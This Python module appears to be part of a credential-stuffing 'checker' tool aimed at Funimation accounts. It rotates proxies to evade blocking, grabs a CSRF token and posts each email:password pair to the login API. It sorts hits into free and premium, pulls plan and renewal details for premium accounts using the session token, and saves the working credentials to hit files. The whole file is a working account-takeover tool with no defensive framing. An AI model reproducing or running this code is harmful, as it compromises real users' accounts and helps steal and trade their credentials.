from modules.variables import Checker
from requests import get,post
from modules.functions import bad_proxy, log,save,set_proxy

def check(email:str,password:str):
    retries = 0

    while retries != Checker.retries:
        proxy = set_proxy()
        proxy_set = set_proxy(proxy)

        header_1 = {
            "User-Agent":"Mozilla/5.0 (Linux; U; Android 2.2) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1", 
            "Host": "www.funimation.com"
        }
        header_2 = {
            "Host": "prod-api-funimationnow.dadcdigital.com" ,
            "User-Agent": "Mozilla/5.0 (Linux; U; Android 2.2) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1", 
            "X-CsrfToken": "",
            "Content-Type": "application/json" 
        }
        header_3 = {
            "Host": "prod-api-funimationnow.dadcdigital.com" ,
            "User-Agent": "Mozilla/5.0 (Linux; U; Android 2.2) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1", 
            "Authorization": "" ,
            "X-CsrfToken": "" 
        }
        data = f"username={email}&password={password}" 
        try:
            csrf = get("https://www.funimation.com/log-in",headers=header_1,proxies=proxy_set,timeout=Checker.timeout).cookies["csrftoken"]
            header_2["X-CsrfToken"] = csrf
            header_3["X-CsrfToken"] = csrf

            response = post("https://prod-api-funimationnow.dadcdigital.com/api/auth/login",proxies=proxy_set, headers=header_2,data=data,timeout=Checker.timeout)
            if response.status_code == 404 or response.status_code == 401:
                retries += 1
            elif "free" in response.text:
                Checker.custom += 1
                Checker.cpm += 1
                if not Checker.cui:
                    log("custom",email+":"+password,"Funimation")
                save("Funimation","custom",Checker.time,email+":"+password)
                return
            elif "premium" in response.text:
                header_3["Authorization"] = "Token "+response.json()["token"]
                
                data = get("https://prod-api-funimationnow.dadcdigital.com/api/source/stripe/subscription/",headers=header_3,proxies=proxy_set,timeout=Checker.timeout).json()
                plan = data["plan"]
                renew = data["renewDateZ"]

                Checker.good += 1
                Checker.cpm += 1
                if not Checker.cui:
                    log("good",email+":"+password,"Funimation")
                save("Funimation","good",Checker.time,email+":"+password+f" | Plan: {plan} | Renew: {renew}")
                return
            else:
                raise
        except:
            bad_proxy(proxy)
            Checker.errors += 1
    Checker.bad += 1 
    Checker.cpm += 1
    return